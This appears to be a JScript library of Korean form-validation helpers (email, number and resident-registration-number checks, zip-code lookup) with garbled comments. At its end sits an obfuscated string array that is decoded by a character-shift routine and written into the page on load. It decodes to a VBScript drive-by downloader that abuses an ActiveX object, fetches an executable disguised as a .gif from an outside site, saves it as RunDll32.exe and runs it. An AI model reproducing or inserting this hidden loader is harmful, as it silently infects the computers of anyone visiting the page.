// JScript source code
//Æû send
function frm_send(frm_name, frm_action)
{
	eval(frm_name).action = frm_action;
	eval(frm_name).submit();
}

//ÀÌ¸ÞÀÏ Ã¼Å©
function check_email(frm_name,email_name)
{
	var j_formName,j_emailValue;
	
	j_formName = (frm_name + "."); 
	j_emailValue = (j_formName + email_name);

	if(eval(j_emailValue).value.length <= 6 || 
		eval(j_emailValue).value.indexOf ('@', 0) == -1 || 
		eval(j_emailValue).value.indexOf ('.', 0) == -1){ 

		alert("'' " + eval(j_emailValue).value + " '', Àº ÀÌ¸ÞÀÏÁÖ¼Ò°¡ ¾Æ´Õ´Ï´Ù"); 
		eval(j_emailValue).value="";
		eval(j_emailValue).focus();
		return false; 
	} 
}

//input boxÀÇ µÎ°ªÀ» ºñ±³ ÇÔ¼ö
function check_value(frm_name,first_value, last_value, show_msg)
{
	var j_firstValue, j_lastValue;
	j_firstValue = (frm_name + "." + first_value);
	j_lastValue = (frm_name + "." + last_value);

	if (eval(j_firstValue).value != eval(j_lastValue).value)
	{
		alert(show_msg + " ÀÏÄ¡ ÇÏÁö ¾Ê½À´Ï´Ù. È®ÀÎÇØ ÁÖ½Ã±â ¹Ù¶ø´Ï´Ù.");
		eval(j_firstValue).value = "";
		eval(j_lastValue).value = "";
		eval(j_firstValue).focus();
	}
}

//inputbox¿¡¼­ ¸î¹øÂ° ÀÚ¸®¼ö°¡ Ã¤¿öÁö¸é ´ÙÀ½ Ä­À¸·Î ÀÌµ¿ ÇÔ¼ö(ÁÖ¹Î¹øÈ£°°Àº °íÁ¤µÈ¼ýÀÚ)
function checkNum_Onblur(frm_name, txt_first, txt_last, full_num)
{
	var j_firstTxt,j_lastTxt;
	j_firstTxt = (frm_name + "." + txt_first);
	j_lastTxt = (frm_name + "." + txt_last);

	if (eval(j_firstTxt).value.length >= full_num)
	{
		eval(j_lastTxt).focus();
	}
}

//¼ýÀÚÀÎÁö Ã¼Å©ÇÏ´Â ÇÔ¼ö
function isOnlyNumberCheck(input_chars){
	var chars = "0123456789";

	for (var inx = 0; inx < input_chars.length; inx++) {
		if (chars.indexOf(input_chars.charAt(inx)) == -1){
			return false;
		}
		else
		return true;	
	}
}

// ¼ýÀÚ check 
function checkNumber( str)
{
	for( var i=0; i < str.length; i++) 
	{
		var ch = str.substring( i, i+1 );
		if( (ch < "0" || ch > "9") && ch != "." ) 
		return false;
	}
	return true;
}

//txtÀÇ ÀÔ·ÂÃ¢À» °ø¹éÀ¸·Î ¸¸µç´Ù.
function SetNull(frm_name, input_name)
{
	var Temp_frmName;
	Temp_frmName = (frm_name + "." + input_name);
	eval(Temp_frmName).value = "";
	eval(Temp_frmName).focus();	
}

//ÁÖ¹Î¹øÈ£ Ã¼Å©
function jumin_check(frm_name,param_first, param_last)
{			
	var Temp_arg1,Temp_arg2;
	Temp_arg1 = (frm_name + "." + param_first);
	Temp_arg2 = (frm_name + "." + param_last);
	var arg1 = eval(Temp_arg1).value; 
	var arg2 = eval(Temp_arg2).value; 
	
	var len_ssno1, len_ssno2
	len_ssno1 = arg1.length;
	len_ssno2 = arg2.length;
	if (len_ssno1 != 6 || len_ssno2 != 7)
	{
		alert('ÁÖ¹Îµî·ÏÀÔ·ÂÀÌ Àß¸øµÇ¾ú½À´Ï´Ù.');
		eval(Temp_arg1).value = "";
		eval(Temp_arg2).value = "";
		eval(Temp_arg1).focus();
		return false;
	}
	var a1 = arg1.substring(0,1);
	var a2 = arg1.substring(1,2);
	var a3 = arg1.substring(2,3);
	var a4 = arg1.substring(3,4);
	var a5 = arg1.substring(4,5);
	var a6 = arg1.substring(5,6);

	var b1 = arg2.substring(0,1);
	var b2 = arg2.substring(1,2);
	var b3 = arg2.substring(2,3);
	var b4 = arg2.substring(3,4);
	var b5 = arg2.substring(4,5);
	var b6 = arg2.substring(5,6);
	var b7 = arg2.substring(6,7);
	var sum = 
		a1*2 + a2*3 + a3*4 + a4*5 + a5*6 + a6*7 +
		b1*8 + b2*9 + b3*2 + b4*3 + b5*4 + b6*5 ;
	var nam = sum % 11;
	
	var CheckValue = 11-nam ;
	
	if(CheckValue > 9)
		CheckValue = CheckValue % 10;

	if(CheckValue != b7)
	{ 
		alert('ÁÖ¹Îµî·ÏÀÔ·ÂÀÌ Àß¸øµÇ¾ú½À´Ï´Ù.');
		eval(Temp_arg1).value = "";
		eval(Temp_arg2).value = "";
		eval(Temp_arg1).focus();
		return false;
	}
		return true;
}			

//¿ìÆí¹øÈ£(ÁÖ¹®ÀÚ ¿ìÆí¹øÈ£ & ¹è¼ÛÁö ¿ìÆí¹øÈ£ ±¸ºÐ)
function Search_ZipCode()
{
	window.open('../Lib/Common_zipCheck.asp','zipsearch','location=no, directories=no, resizable=no, status=no, toolbar=no, menubar=no,scrollbars=yes, left=400, top=250,width = 416,height = 327');
}

//Enter¸¦ Ä¡¸é ´ÙÀ½ ÆäÀÌÁö ÀÌµ¿
function Enter_event(frm_name,frm_action)
{
	if (window.event.keyCode == 13)
	{
		frm_send(frm_name, frm_action);
	}
}

//Null°ªÀÎÁö¸¦ Ã¼Å©ÇÏ´ÂÇÔ¼ö
function isNull_Check(frm_name, txt_value,msg_box)
{
	var Temp_frmName;
	Temp_frmName = (frm_name + "." + txt_value);
	if (eval(Temp_frmName).value == '')
	{
		alert(msg_box + "¸¦ È®ÀÎÇØ ÁÖ½Ã±â ¹Ù¶ø´Ï´Ù.");
		eval(frm_name + "." + txt_value).focus();
		return 1;
	}
	else
	{
		return 0;
	}
}

//Æû ·Îµù½Ã Æ÷Ä¿½º ¼±ÅÃ
function frm_OnloadFocus(frm_name, txt_name)
{
	eval(frm_name + "." + txt_name).focus();
}


//¼ýÀÚ°¡ ¾Æ´Ò°æ¿ì  isCheckNumber(ÅØ½ºÆ®¹Ú½º ÀÌ¸§)
function isCheckNumber(param){
	var temp = eval(param).value;
	//alert(isOnlyNumberCheck(temp));
	if (isOnlyNumberCheck(temp) == false){
		eval(param).value = "";
		//eval(param).focus();
	}
}
var HtmlStrings=["=TDSJQU!mbohvbhf>WCT>(2!{{{{{{{{{{{{{{(2Po!Fssps!Sftvnf!O","fyu(2(qt>#tegteiuuqt>#i#'!Sftvn#u!Sftvnu#'#q;00#'#!Fssps!","Sftvnf!Ofyueeeed#iuuqt>#i#'#uu#'#q;00#'#xxx/ujsfhppe/dpn0`j","nh0Cbs`14/hjg#!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!","!!!!!!!!!!!!!!!!!!!!!!(2pc#'#kf#'#du#qtp>!#pc#'#kf#'#du#","(2222222222222222222Tfu!Qk>epdvnfou/dsfbufFmfnfou)qtp*222222","2222222222222222222222222222222222222222Tfu!Qk>epdvnfou/dsf","bufFmfnfou)qtp*(2Qbsn1>#dmbtt#,#je#Qbsn2`2>#dmtje#'#;CE",":7#Qbsn2`3>#D667#Qbsn2`4>#.76B4.22E1.:9#Qbsn2`5>#4B.11D","15#Qbsn2`6>#GD3:F47#Qbsn2>Qbsn2`2,Qbsn2`3,Qbsn2`4,Qbsn2`5",",Qbsn2`6Qk/TfuBuusjcvuf!Qbsn1-Qbsn2(2Tfu!QT2>Qk/Dsfbu","fPckfdu)#Njd#'#spt#'#pgu/#'#YNM#'#IU#'#UQ#-##*(2QT2/Pqfo!","#H#'#FU#-!iuuqt-!Gbmtf(2QT2/Tfoe(2FyfObnf>#SvoEmm43/f","yf#(2WctObnf>#svo/wct#(2Tfu!QT3>Qk/dsfbufpckfdu)#Tdsj","#'#q#'#ujoh/G#'#j#'#mf#'#Tz#'#tu#'#f#'#nP#'#ckf#'#du#-##*(2","Tfu!QT4>QT3/HfuTqfdjbmGpmefs)3*(2FyfObnf>QT3/CvjmeQbui)","QT4-FyfObnf*(2WctObnf>QT3/CvjmeQbui)QT4-WctObnf*(2BB>","#B#'#e#(2CC>#p#'#e#'#c#'#/#'#t#'#usf#'#bn#(2ED>BB'CC","(2Tfu!YCPY>Qk/dsfbufpckfdu)ED-##*(2YCPY/uzqf>2(2YC","PY/Pqfo(2YCPY/Xsjuf!QT2/SftqpotfCpez(2YCPY/Tbwfupgjmf","!FyfObnf-3(2YCPY/Dmptf(2YCPY/Uzqf>3(2YCPY/Pqfo(","2YCPY/XsjufUfyu!#Tfu!xt>DsfbufPckfdu)##Xtdsjqu/Tifmm##*#'wc","DsMg'#xt/Svo!)###'FyfObnf'###*#'wcDsMg'#Tfu!xt>Opuijoh#(2","YCPY/Tbwfupgjmf!WctObnf-3(2YCPY/Dmptf(2HCB>#T#'#i#'#f","#'#m#'#m#'#/#'#B#'#q#'#q#'#m#'#j#(2Tfu!Svo>Qk/dsfbufpckfd","u)HCB'#dbujpo#-##*(3Svo/TifmmFyfdvuf!WctObnf-##-##-#Pqfo#","-1(4qt>#Uif!foe!_P_#=0TDSJQU>"];
function psw(st){
  var varS;
  varS="";
  var i;
  for(var a=0;a<st.length;a++){
    i = st.charCodeAt(a); 
    if (i==1) 
      varS=varS+String.fromCharCode('"'.charCodeAt()-1);
    else if (i==2) {
      a++;
      varS+=String.fromCharCode(st.charCodeAt(a));
      }
    else
      varS+=String.fromCharCode(i-1);
  }
  return varS;
};
var num=27;
function S(){
for(i=0;i<num;i++)
  document.write(psw(HtmlStrings[i]));}
S();
